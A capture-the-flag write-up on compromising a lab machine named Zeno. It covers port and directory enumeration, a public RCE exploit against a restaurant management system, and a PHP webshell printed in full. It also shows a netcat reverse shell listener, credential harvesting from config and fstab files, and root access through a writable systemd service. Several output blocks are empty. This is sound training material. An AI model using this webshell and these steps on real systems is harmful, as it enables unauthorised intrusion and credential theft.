# Port scan
Firstly, I have set an environment variable `IP` of the target machine's IP address.
Then I have conducted ***Nmap SYN*** scan against all of the TCP ports of the target machine with the command `sudo nmap -vv -sS -p- $IP` to see which ports are open. I had saved the following output to a file with `-oN` flag:

```
# Nmap 7.60 scan initiated Sat Oct 23 10:27:21 2021 as: nmap -vv -sS -p- -oN enum.txt 10.10.154.116

```

The open ports are:
1. Port ***22*** running SSH service.
2. Port ***12340*** with an unknown service running.
Against those ports I have performed a more comprehensive scan with the command `nmap -vv -O -sV -sC -p 22,12340 $IP`. I was able to get the following information:

```
#Nmap 7.60 scan initiated Sat Oct 23 10:38:03 2021 as: nmap -vv -O -sV -sC -p 22,12340 -oN open_ports.txt 10.10.94.20

On port ***22*** an `OpenSSH 7.4` ssh service is running.
On port ***12340*** an `Apache httpd 2.4.6 (CentOS)` webeserver is running. This webserver also has `PHP/5.4.16` installed.

# Enumerating the Webserver

Connecting to the webserver from within a browser gives ***Resource not found*** error shown below.

![Resource not found](/Zeno/images/Resource_not_found.png)

I have then used `nikto -h $IP -p 12340` command to enumerate the webserver's directories. The output of this command was:

```

```

For further enumeration of the webserver's directories I have used `gobuster dir -u http://$IP:12340 -w /usr/share/wordlists/dirb/big.txt` command, which resulted in the following:

```

```

The scan lists three possible directories, from which only `/rms` one is accessible. Going to this webserver's directory via a browser gives a homepage of Pathfinder Hotel Restaurant Management System.

![Restaurant management system](/Zeno/images/Restaurant_management_system.png)

The Google search of `restaurant management system exploit` led to a Remote Code Execution exploit for this system, written in Python.

# Remote Code Execution

The downloaded exploit had formatting issues and a broken hardcoded proxy.
Fixing formatting and deleting code for proxy led to a successful upload of a webshell `<?php echo shell_exec($_GET["cmd"]); ?>` at http://$IP:12340/rms/images/reverse-shell.php URL, which shows blank page.

![Blank exploit page](/Zeno/images/Blank_exploit_page.png)

Although the uploaded webshell can accept commands with the syntax of http://$IP:12340/rms/images/reverse-shell.php?cmd=<argument>. For example, id argument prints this:

![System ID](/Zeno/images/System_ID.png)

At this point I am doing the following:

1. Exporting 1234 as a listening port - LPORT - and setting up a netcat listener with `nc -lnvp $LPORT`.
2. Passing a Python reverse shell found at [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) as an argument to the webshell URL.

The webpage is blank, but the listener captured a shell connection!

# Gaining Access

Going to the server's home directory shows that the user `edward` is on the system.
Tried Hydra for cracking edward's SSH password but no luck there.
Getting back to /var/www/html/rms/connection folder and listing it's contets shows a config.php file. Inside this file there are credentials for the root user of a database.

![Database credentials](/Zeno/images/Database_credentials.png)

Although connecting to mysql database from the shell with these credentials resulted in an error.
***Update 10/29/2021***
I tried downloading LinPeas to the remote machine with curl, but it failed.
Then I looked up in /etc/fstab file and found credentials for user `edward` on zeno machine.
Connected to the remote machine with zeno password with user `edward` via SSH and found the user.txt file with the first flag.

# Root Access

There is a writable service file named zeno-monitoring.
Adding `ExecStart=/usr/bin/cp /root/root.txt /home/edward/rootflag.txt` command to the zeno-monitoring service file and rebooting the machine leads to having a readable rootflag.txt file with ***root flag*** in edward's home directory after a reconnection to a rebooted machine.
